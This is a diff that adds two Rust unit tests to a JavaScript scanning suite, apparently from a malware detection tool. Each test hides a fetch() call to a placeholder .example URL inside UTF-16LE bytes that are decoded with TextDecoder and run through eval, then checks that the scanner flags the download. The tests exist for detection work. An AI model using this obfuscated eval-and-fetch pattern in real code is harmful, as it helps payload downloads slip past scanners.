@@ -13761,6 +13761,60 @@ mod js_url_extraction_tests {
     }
 
     #[test]
+    fn js_textdecoder_utf16le_uint8array_payload_url_extracted() {
+        let mut env = Environment::new(&Config::default());
+        let payload = "fetch('https://textdecoder-utf16le-js.example/p')";
+        let bytes = payload
+            .encode_utf16()
+            .flat_map(u16::to_le_bytes)
+            .map(|byte| byte.to_string())
+            .collect::<Vec<_>>()
+            .join(",");
+        let js = format!(r#"eval(new TextDecoder("utf-16le").decode(new Uint8Array([{bytes}])))"#)
+            .into_bytes();
+        env.all_extracted_jscript.push(js);
+        crate::js_scan::scan_js_payloads(&mut env);
+        let has = env.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, .. } if src == "https://textdecoder-utf16le-js.example/p"
+            )
+        });
+        assert!(
+            has,
+            "JS TextDecoder UTF-16LE Uint8Array payload URL missed: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
+    fn js_textdecoder_bound_utf16le_uint8array_payload_url_extracted() {
+        let mut env = Environment::new(&Config::default());
+        let payload = "fetch('https://textdecoder-bound-utf16le-js.example/p')";
+        let bytes = payload
+            .encode_utf16()
+            .flat_map(u16::to_le_bytes)
+            .map(|byte| byte.to_string())
+            .collect::<Vec<_>>()
+            .join(",");
+        let js = format!(
+            r#"var a = new Uint8Array([{bytes}]); eval(new TextDecoder("utf-16le").decode(a))"#
+        )
+        .into_bytes();
+        env.all_extracted_jscript.push(js);
+        crate::js_scan::scan_js_payloads(&mut env);
+        let has = env.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, .. } if src == "https://textdecoder-bound-utf16le-js.example/p"
+            )
+        });
+        assert!(
+            has,
+            "JS TextDecoder bound UTF-16LE Uint8Array payload URL missed: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
     fn js_atob_payload_url_extracted() {
         let mut env = Environment::new(&Config::default());
         let encoded = base64::Engine::encode(
